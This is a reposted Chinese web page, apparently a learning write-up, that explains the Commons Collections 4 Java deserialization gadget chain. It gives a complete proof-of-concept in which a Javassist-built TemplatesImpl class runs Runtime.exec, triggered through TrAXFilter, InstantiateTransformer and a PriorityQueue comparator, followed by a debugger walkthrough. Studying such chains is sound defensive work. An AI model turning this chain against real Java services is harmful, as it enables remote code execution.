@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html xml:lang="zh-CN" lang="zh-CN">
+
+<head>
+        <link rel="canonical" href="https://node-clash.github.io/news/article-58021.htm" />
+    <!-- Required Meta Tags -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>CommonsCollection4反序列化链学习</title>
+        <meta name="description" content="1、前置知识 由于cc4没有新的知识点，主要是用cc2，然后稍微cc3结合了，所以我们可以看ysoserial源码，自己尝试构造一下，把cc2通过获取InvokeTransformer()获取temp" />
+        <link rel="icon" href="/assets/website/img/node_clash/favicon.ico" type="image/x-icon"/>
+
+    <meta name="author" content="Clash Node机场节点分享官网">
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="https://node-clash.github.io/news/article-58021.htm" />
+    <meta property="og:site_name" content="Clash Node机场节点分享官网" />
+    <meta property="og:title" content="CommonsCollection4反序列化链学习" />
+    <meta property="og:image" content="https://node-clash.github.io/uploads/20240909-1/f6b038e2116208849f4f1c844bed1d59.webp" />
+        <meta property="og:release_date" content="2025-02-17T09:56:47" />
+    <meta property="og:updated_time" content="2025-02-17T09:56:47" />
+        <meta property="og:description" content="1、前置知识 由于cc4没有新的知识点，主要是用cc2，然后稍微cc3结合了，所以我们可以看ysoserial源码，自己尝试构造一下，把cc2通过获取InvokeTransformer()获取temp" />
+    
+    <meta name="applicable-device" content="pc,mobile" />
+    <meta name="renderer" content="webkit" />
+    <meta name="force-rendering" content="webkit" />
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta name="robots" content="max-image-preview:large" />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="CommonsCollection4反序列化链学习">
+    <meta name="format-detection" content="telephone=no">
+
+    <link rel="dns-prefetch" href="https:/www.googletagmanager.com">
+    <link rel="dns-prefetch" href="https://www.googleadservices.com">
+    <link rel="dns-prefetch" href="https://www.google-analytics.com">
+    <link rel="dns-prefetch" href="https://pagead2.googlesyndication.com">
+    <link rel="dns-prefetch" href="https://cm.g.doubleclick.net">
+        
+    <!-- CSS Files -->
+    <link rel="stylesheet" href="/assets/website/css/node_clash/animate.css">
+    <link rel="stylesheet" href="/assets/website/css/node_clash/bootstrap.min.css">
+    <link rel="stylesheet" href="/assets/website/css/node_clash/font-awesome.min.css">
+    <link rel="stylesheet" href="/assets/website/css/node_clash/slick.css">
+    <link rel="stylesheet" href="/assets/website/css/node_clash/magnific-popup.css">
+    <link rel="stylesheet" href="/assets/website/css/node_clash/jquery.lineProgressbar.css">
+    <link rel="stylesheet" href="/assets/website/css/node_clash/style.css">
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FTZXQP7KV5"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-FTZXQP7KV5');
+</script>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3332997411212854"
+     crossorigin="anonymous"></script>
+</head>
+
+<body data-page="detail">
+        <!-- Preloader Starts -->
+    <div class="preloader" id="preloader">
+        <div class="preloader-inner">
+            <div class="spinner">
+                <div class="bounce1"></div>
+                <div class="bounce2"></div>
+                <div class="bounce3"></div>
+            </div>
+        </div>
+    </div>
+    <!-- Header Section Starts -->
+    <header class="cropium-header-section fixed-navigation">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-12">
+                    <!-- Navbar Starts -->
+                    <nav class="navbar navbar-area navbar-expand-lg nav-style-02 nav-absolute">
+                        <div class="container nav-container">
+                            <div class="responsive-mobile-menu">
+                                <div class="logo-wrapper">
+                                    <a href="/" class="logo">
+                                                                        <span>Node Clash</span>
+                                                                        </a>
+                                </div>
+                                <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#cropium-main-menu" aria-expanded="false" aria-label="Toggle navigation">
+                                    <span class="toggle-icon"></span>
+                                    <span class="toggle-icon"></span>
+                                    <span class="toggle-icon"></span>
+                                </button>
+                            </div>
+                            <div class="collapse navbar-collapse" id="cropium-main-menu">
+                                <ul class="navbar-nav">
+                                                                        <li>
+                                        <a href="/">首页</a>
+                                    </li>
+                                                                        <li>
+                                        <a href="/free-nodes/">免费节点</a>
+                                    </li>
+                                                                        <li>
+                                        <a href="/paid-subscribe/">推荐机场</a>
+                                    </li>
+                                                                        <li>
+                                        <a href="/client.htm">客户端</a>
+                                    </li>
+                                                                        <li>
+                                        <a href="/news/">新闻资讯</a>
+                                    </li>
+                                                                    </ul>
+                            </div>
+                        </div>
+                    </nav>
+                    <!-- Navbar End -->
+                </div>
+            </div>
+        </div>
+    </header>
+    <!-- Breadcrumb Area Starts -->
+    <section class="breadcrumb-section">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-12">
+                    <h1 class="title">CommonsCollection4反序列化链学习</h1>
+                    <a href="/">首页</a> / <a href="/news/">新闻资讯</a> <span> / 正文</span>
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- About Section Starts -->
+    <section class="cropium-about-section padding-top-90 padding-bottom-120">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-9">
+                                    <input type="hidden" id="share-website-info" data-name="" data-url="">
+                  				  				  				</h1> <h2 id="1前置知识">1、前置知识</h2> <p>由于cc4没有新的知识点，主要是用cc2，然后稍微cc3结合了，所以我们可以看ysoserial源码，自己尝试构造一下，把cc2通过获取InvokeTransformer()获取templatesImpl的newtransformer()方法，改成用cc3的InstantiateTransformer初始化。那就把跟cc2不同的代码学习下。</p> <h3 id="11transformingcomparator">1.1、transformingComparator</h3> <p>与cc2最大的不容就是transformingComparator的构造方式不同，这里是通过获取InstantiateTransformer实例化TrAXFilter并且把templatesImpl恶意类传入，其实就是<strong>InstantiateTransformer(templateImpl).transform(TrAXFilter)</strong>。而且这就是cc3所用的方式，所以cc3在cc4占很少的部分，主要还是cc2</p> <pre><code class="language-java">Transformer[] transformers=new Transformer[]{         new ConstantTransformer(TrAXFilter.class),//第一个获取TrAXFilter         new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})//通过InstantiateTransformer的构造方法传入我们的恶意类templatesImpl，调用其transform方法，实例化传入的TrAXFilter，调用其构造方法。再调用newTransform  }; ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);//新建一个ChainedTransformer类，传入我们的恶意transformers,只要调用transform方法就会反射执行我们的传入的恶意传入我们的恶意transformers  TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);</code></pre> <h2 id="2poc分析">2、PoC分析</h2> <h3 id="21poc">2.1、Poc</h3> <pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import org.apache.commons.collections4.functors.InvokerTransformer;  import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue;  public class CommonsCollection4 {       public static void main(String[] args) throws Exception {         String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";         String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";          ClassPool classPool=ClassPool.getDefault();//返回默认的类池         classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径         CtClass payload=classPool.makeClass("com/akkacloud/CommonsCollection2Test");//创建一个新的public类         payload.setSuperclass(classPool.get(AbstractTranslet));  //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet         payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\");"); //创建一个空的类初始化，设置构造函数主体为runtime          //payload.writeFile("/Users/akka/Documents/study/JAVA-project/ysoserial/CommonsColection2/src/main/java");         byte[] bytes=payload.toBytecode();//转换为byte数组         //String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";         Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();//反射创建TemplatesImpl         Field field=templatesImpl.getClass().getDeclaredField("_bytecodes");//反射获取templatesImpl的_bytecodes字段         field.setAccessible(true);//暴力反射         field.set(templatesImpl,new byte[][]{bytes});//将templatesImpl上的_bytecodes字段设置为runtime的byte数组          Field field1=templatesImpl.getClass().getDeclaredField("_name");//反射获取templatesImpl的_name字段         field1.setAccessible(true);//暴力反射         field1.set(templatesImpl,"test");//将templatesImpl上的_name字段设置为test  /*        Method getTransletName = templatesImpl.getClass().getDeclaredMethod("getTransletName", new Class[]{});         getTransletName.setAccessible(true);         Object name = getTransletName.invoke(templatesImpl, new Object[]{});         System.out.println(name.toString());          Method getTransletBytecodes = templatesImpl.getClass().getDeclaredMethod("getTransletBytecodes", new Class[]{});         getTransletBytecodes.setAccessible(true);         byte[][] bytes1 = (byte[][]) getTransletBytecodes.invoke(templatesImpl, new Object[]{});         for (int i = 0; i &lt; bytes1.length; i++) {             System.out.println(bytes1.length);             System.out.println(Arrays.toString(bytes1[i]));         }*/          Transformer[] transformers=new Transformer[]{                 new ConstantTransformer(TrAXFilter.class),//第一个获取TrAXFilter                 new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})//通过InstantiateTransformer的构造方法传入我们的恶意类templatesImpl，调用其transform方法，实例化传入的TrAXFilter，调用其构造方法。再调用newTransform          };         ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);//新建一个ChainedTransformer类，传入我们的恶意transformers,只要调用transform方法就会反射执行我们的传入的恶意传入我们的恶意transformers          TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);          PriorityQueue priorityQueue = new PriorityQueue(2);//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。         priorityQueue.add(1);//添加数字1插入此优先级队列         priorityQueue.add(1);//添加数字1插入此优先级队列          Field field2=priorityQueue.getClass().getDeclaredField("comparator");//获取PriorityQueue的comparator字段         field2.setAccessible(true);//暴力反射         field2.set(priorityQueue,transformingComparator);//设置priorityQueue的comparator属性值为transformingComparator          ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("test.ser"));         outputStream.writeObject(priorityQueue);         outputStream.close();          ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("test.ser"));         inputStream.readObject();         } }</code></pre> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/84a594027e9869bd4059b17a5abf6574.jpg" alt="CommonsCollection4反序列化链学习"></p> <h3 id="22poc调试">2.2、poc调试</h3> <p>在PriorityQueue的readObject打断点，发现队列内就是两个数字，进入heapify()</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/0c056ce0e551c67eae8cc5f86937115b.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>因为在poc中我们没对queue字段赋值，所以queue里面就是两个数字，继续跟入siteDown()</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/9dcbfaaac19dc31ccb8a49629f6f4241.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>发现x就是queue为空，与cc2此时的x为templatImpl，继续进入siftDownUsingComparator</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/75c08ec62d1dc7ac4c4c73302db5e27c.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>进入发现，通过comparator.compare(),这个comparator就是我们的恶意TransformingComparator</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/613ef9ebb1aacc142addfa63488c4ad4.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>进入发现TransformingComparator的compare方法里，用this.transformer调用了transform方法，此时的this.transformer是我们传入的ChainedTransformer，链式调用transform</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/e4fb2106781139889ca028ec6f4a797a.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>进入后看到第一个是ConstantTransformer，继续跟进transform方法</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/6bdc85e64e6354ba55e91a49759e3526.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>返回我们一开始构造的TrAXFilter.class</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/7794999994be7591e23690cbaead6a11.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>第二遍是进入InstantiateTransformer ，object为我们上次循环获取TrAXFilter.class.继续跟进transform()</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/5d60e424dc99179ffebd52658e78d527.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>这个transform就是实例化传入的object既TrAXFilter，而且传入的参数值为我们一起开始创建的恶意加载字节类TransformerImpl</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/3cc72a1ebab4ecb8231b191dad0f7eb6.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>进入TrAXFilter的构造方法，传入的TransformerImpl被赋值给了templates，templates调用newTransformer方法，继续跟进</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/4053a6d56747f82c3fbfca71f953de89.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>TransformerImpl的newTransformer方法，会调用本类的getTransletInstance方法，继续跟进</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/dc40946cbc03f89b8931759229136802.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>发现会继续调用defineTransletClasses()，继续跟进</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/09c72b1c7ea2b97aaf03a40edd4c4ded.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>进入defineTransletClasses方法后发现，会把我们前面构造的_bytecodes[i]传输给_class[i],饭后返回到getTransletInstance方法</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/7fea6927a613b9eccd7b8c02145e97b9.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>然后在getTransletInstance方法后，实例化我们传入的_class[i]恶意类<mark>》TemplatesImpl</mark>》CommonsCollection2Test.</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/89b07006097f1bc7ced2773721289386.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>实例化就会调用我们一开始设置的静态代码块，造成RCE</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/e4f8b70a95347430a5b2ae087167ee6f.jpg" alt="CommonsCollection4反序列化链学习"></p> <h3 id="23利用链">2.3、利用链</h3> <pre><code class="language-java">Gadget chain: 		ObjectInputStream.readObject() 			PriorityQueue.readObject()         PriorityQueue.heapify()           PriorityQueue.siftDown()             PriorityQueue.siftDownUsingComparator()               ...                 TransformingComparator.compare()                   InstantiateTransformer.transform()                     Method.invoke()                       Runtime.exec()</code></pre> <h3 id="24思维导图">2.4、思维导图</h3> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/4520c68ba4af81158b42d55f39d15b37.jpg" alt="CommonsCollection4反序列化链学习"></p> <h3 id="25结束">2.5、结束</h3> <p>cc4链还是比较简单，我继续每一步调试的原因就是可以更好的复习前面学习的链，我cc2和cc4用的是commonscollection4依赖版本才成功，cc1、cc3和cc5是用的jdk8u66才成功的</p> 			                <div class="clearfix"></div>
+                <div class="col-md-12 mt-5">
+                                        <p>上一个：<a href="/news/article-57450.htm">动物医院实践心得5000字怎么写的（动物医院心得体会）</a></p>
+                                        <p>下一个：<a href="/news/article-58022.htm">动物疫苗生产企业资质（生产动物疫苗所需资质）</a></p>
+                                    </div>
+                                </div>
+                <div class="col-md-3">
+                    <div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">热门文章</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2"><a href="/news/article-27974.htm" title="动物疫苗类型有几种（动物疫苗有哪几种）">动物疫苗类型有几种（动物疫苗有哪几种）</a></li>
+                        <li class="py-2"><a href="/news/article-37997.htm" title="狗粮牌子排行榜（“狗粮排名前十品牌”）">狗粮牌子排行榜（“狗粮排名前十品牌”）</a></li>
+                        <li class="py-2"><a href="/news/article-19201.htm" title="我们如何使用MySQL函数STR_TO_DATE（Column，&#8217;％input_format&#8217;）？">我们如何使用MySQL函数STR_TO_DATE（Column，&#8217;％input_format&#8217;）？</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-11-27-node-share.htm" title="11月27日→21.4M/S|2024年最新免费节点Clash Node订阅链接地址">11月27日→21.4M/S|2024年最新免费节点Clash Node订阅链接地址</a></li>
+                        <li class="py-2"><a href="/news/article-31743.htm" title="【SpringBoot】核心依赖和自动配置">【SpringBoot】核心依赖和自动配置</a></li>
+                        <li class="py-2"><a href="/news/article-28902.htm" title="北京动物咬伤去哪打疫苗（北京动物园咬伤）">北京动物咬伤去哪打疫苗（北京动物园咬伤）</a></li>
+                        <li class="py-2"><a href="/news/article-30809.htm" title="【哈尔滨宠物店|哈尔滨宠物服务信息】（哈尔滨市宠物店）">【哈尔滨宠物店|哈尔滨宠物服务信息】（哈尔滨市宠物店）</a></li>
+                        <li class="py-2"><a href="/news/article-56891.htm" title="动物注射疫苗的流程图片视频（动物注射疫苗的流程图片视频教程）">动物注射疫苗的流程图片视频（动物注射疫苗的流程图片视频教程）</a></li>
+                        <li class="py-2"><a href="/news/article-39969.htm" title="兽用疫苗注射到人体如何处理（兽用疫苗对人体有害吗）">兽用疫苗注射到人体如何处理（兽用疫苗对人体有害吗）</a></li>
+                        <li class="py-2"><a href="/news/article-35154.htm" title="PyQt5 按钮Button 添加事件(信号/槽)">PyQt5 按钮Button 添加事件(信号/槽)</a></li>
+                    </ul>
+    </div>
+</div>
+
+<div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">归纳</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">57</span> <a href="/date/2025-02/" title="2025-02 归档">2025-02</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">93</span> <a href="/date/2025-01/" title="2025-01 归档">2025-01</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">93</span> <a href="/date/2024-12/" title="2024-12 归档">2024-12</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">30</span> <a href="/date/2024-11/" title="2024-11 归档">2024-11</a></h4>
+            </li>
+                    </ul>
+    </div>
+</div>
+
+                </div>
+            </div>
+        </div>
+    </section>
+        <!-- Footer Section Starts -->
+    <footer class="footer-section common-footer">
+        <div class="footer-bottom">
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-6">
+                        <div class="footer-logo">
+                            <p>
+                                <a href="/">首页</a> | 
+                                <a href="/free-node/">免费节点</a> | 
+                                <a href="/news/">新闻资讯</a> |
+                                <a href="/about-us.htm">关于我们</a> |
+                                <a href="/disclaimer.htm">免责申明</a> |
+                                <a href="/privacy.htm">隐私申明</a> |
+                                <a href="/sitemap.xml">网站地图</a>
+                            </p>
+                            <a href="/">Clash Node机场节点分享官网</a> 版权所有 Powered by WordPress
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+    <!-- Javascript Files -->
+    <script src="/assets/website/js/frontend/node_clash/vendor/jquery-2.2.4.min.js"></script>
+    <script src="/assets/website/js/frontend/node_clash/vendor/bootstrap.min.js"></script>
+    <script src="/assets/website/js/frontend/node_clash/vendor/slick.min.js"></script>
+    <script src="/assets/website/js/frontend/node_clash/vendor/counterup.min.js"></script>
+    <script src="/assets/website/js/frontend/node_clash/vendor/waypoints.min.js"></script>
+    <script src="/assets/website/js/frontend/node_clash/vendor/jquery.magnific-popup.js"></script>
+    <script src="/assets/website/js/frontend/node_clash/vendor/jquery.lineProgressbar.js"></script>
+    <script src="/assets/website/js/frontend/node_clash/vendor/lineProgressbarActivate.js"></script>
+    <script src="/assets/website/js/frontend/node_clash/vendor/easing.min.js"></script>
+    <script src="/assets/website/js/frontend/node_clash/vendor/wow.min.js"></script>
+    <script src="/assets/website/js/frontend/node_clash/main.js"></script>
+    <script src="https://www.freeclashnode.com/assets/js/frontend/invite-url.js"></script><script src="/assets/website/js/frontend/G.js"></script>
+</body>
+
+</html>
